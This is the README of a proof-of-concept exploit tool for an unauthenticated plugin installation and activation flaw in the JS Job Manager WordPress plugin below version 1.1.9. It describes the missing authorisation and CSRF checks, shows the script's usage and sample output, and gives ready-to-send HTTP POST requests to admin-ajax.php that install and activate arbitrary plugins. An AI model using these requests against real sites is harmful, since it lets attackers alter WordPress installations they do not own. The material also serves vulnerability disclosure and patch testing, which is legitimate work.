# js-jobs
JS Job Manager &lt; 1.1.9 - Unauthenticated Arbitrary Plugin Installation/Activation


# Description
The jsjobs_ajax AJAX action of the plugin available to both authenticated and unauthenticated users does not have proper authorisation and CSRF checks, in particular when using the installPluginFromAjax and activatePluginFromAjax, which could allow unauthenticated attackers to install arbitrary plugins from the WordPress repository, and active them (with some limitation).

There is no control over version of the plugin so you it will install the latest version of the plugin.

How to use
---

```
usage: js-jobs.py [-h] --url URL --slug SLUG
js-jobs.py: error: the following arguments are required: --url/-u, --slug/-s
```

Example
---

```
$ python3 js-jobs.py --url http://192.168.1.131:5555 -s woocommerce
Plugin has been Downloaded.
Plugin has been downloaded and is on the server.
Plugin has been activated / activated.
```



Proof of Concept
---
To install a plugin:
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 90
Connection: close

action=jsjobs_ajax&task=installPluginFromAjax&jsjobsme=jsjobs&pluginslug=<slug>
```

To activate a plugin (there is a limitation here, as the plugin must have the <slug>/<slug>.php file, otherwise it won't be activated):
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 78
Connection: close

action=jsjobs_ajax&task=activatePluginFromAjax&jsjobsme=jsjobs&pluginslug=<slug> 
```
